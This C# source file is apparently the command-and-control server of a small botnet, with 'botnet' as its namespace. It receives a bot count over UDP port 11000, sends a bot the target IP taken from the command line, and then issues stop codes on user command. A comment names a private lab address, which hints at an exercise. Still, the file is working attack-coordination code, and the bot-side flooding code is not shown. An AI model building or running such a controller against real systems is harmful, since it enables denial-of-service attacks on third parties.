using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Text;

namespace botnet
{
    class Server
    {
        static void Main(string[] args)
        {   // target is 192.168.56.103
            Console.WriteLine("Hello World!");
            IPAddress target = IPAddress.Parse(args[0]);
            // start the server with the target IP as param
            StartServer(target);
        }

        public static void StartServer(IPAddress target)
        {
            // connect to the bots
            UdpClient udpServer = new UdpClient(11000);
            var stopcode = "go";
            try
            {
                // set endpoint, listen on port 11000
                var remoteEP = new IPEndPoint(IPAddress.Any, 11000);
                // convert address to bytes
                byte[] info = target.GetAddressBytes();
                // receive bot count
                byte[] data = udpServer.Receive(ref remoteEP);
                // should be the number of bots
                int count = int.Parse(Encoding.UTF8.GetString(data));
                // wait for bot
                Console.WriteLine("received data from " + remoteEP.ToString());
                // send address to bot
                udpServer.Send(info, remoteEP);

                // bots should be running at this point
                // wait for stopcode from user
                while (stopcode != "stop")
                {
                    Console.Write("Please enter \"stop\" to end program: ");
                    stopcode = Console.ReadLine();
                    stopcode = stopcode == "" ? "go" : stopcode;
                }
#pragma warning disable 8604 // disable warning of possible null string
                info = Encoding.ASCII.GetBytes(stopcode);
#pragma warning restore 8604
                Console.WriteLine("Sending kill code to bots ...");

                // send stopcodes to bots
                for (int i = 0; i < count; i++)
                {
                    udpServer.Send(info, remoteEP);
                }
                // wait until all the bots are killed
                while (stopcode != "complete")
                {
                    // check if completion code is sent
                    if (udpServer.Available > 0)
                    {
                        Console.WriteLine("Received completion code!");
                        info = udpServer.Receive(ref remoteEP);
                        stopcode = Encoding.UTF8.GetString(info);
                    }
                }
                // close the server
                Console.WriteLine("Closing server ...");
                udpServer.Close();
            }
            catch (Exception e) // catch random exceptions
            {
                Console.WriteLine(e);
            }
        }
    }
}
